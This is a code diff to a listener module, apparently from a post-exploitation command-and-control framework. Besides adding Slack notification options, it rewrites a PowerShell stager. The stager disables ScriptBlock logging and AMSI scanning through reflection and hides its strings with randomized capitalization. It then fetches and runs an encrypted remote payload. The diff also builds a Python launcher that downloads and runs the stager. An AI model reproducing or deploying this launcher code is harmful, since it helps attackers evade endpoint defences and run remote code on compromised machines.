@@ -71,6 +71,16 @@ class Listener:
                 'Description'   :   'Folder to output redirectors to.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/http_hop/'
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -124,17 +134,24 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
                     # ScriptBlock Logging bypass
-                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
-                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
+                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").GetValue($null);If($GPS")
+                    stager += "['ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("){$GPS")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += helpers.randomize_capitalization("$GPS")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    stager += "'signatures','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
@@ -142,6 +159,7 @@ class Listener:
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
@@ -176,7 +194,7 @@ class Listener:
                             password = proxyCreds.split(':')[1]
                             domain = username.split('\\')[0]
                             usr = username.split('\\')[1]
-                            stager += "$netcred = New-Object System.Net.NetworkCredential("+usr+","+password+","+domain+");"
+                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                 # TODO: reimplement stager retries?
@@ -204,7 +222,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(stager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -247,7 +265,7 @@ class Listener:
                 # add the RC4 packet to a cookie
                 launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
                 launcherBase += "import urllib2\n"
-                
+
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
                         launcherBase += "proxy = urllib2.ProxyHandler();\n"
@@ -262,7 +280,7 @@ class Listener:
                             launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
-                            launcherBase += "proxy_auth_handler.add_password(None,"+proxy+","+username+","+password+");\n"
+                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
                             launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                     else:
                         launcherBase += "o = urllib2.build_opener(proxy);\n"
@@ -271,7 +289,7 @@ class Listener:
 
                 #install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib2.install_opener(o);\n"
-                
+
                 # download the stager and extract the IV
                 launcherBase += "a=o.open(server+t).read();"
                 launcherBase += "IV=a[0:4];"
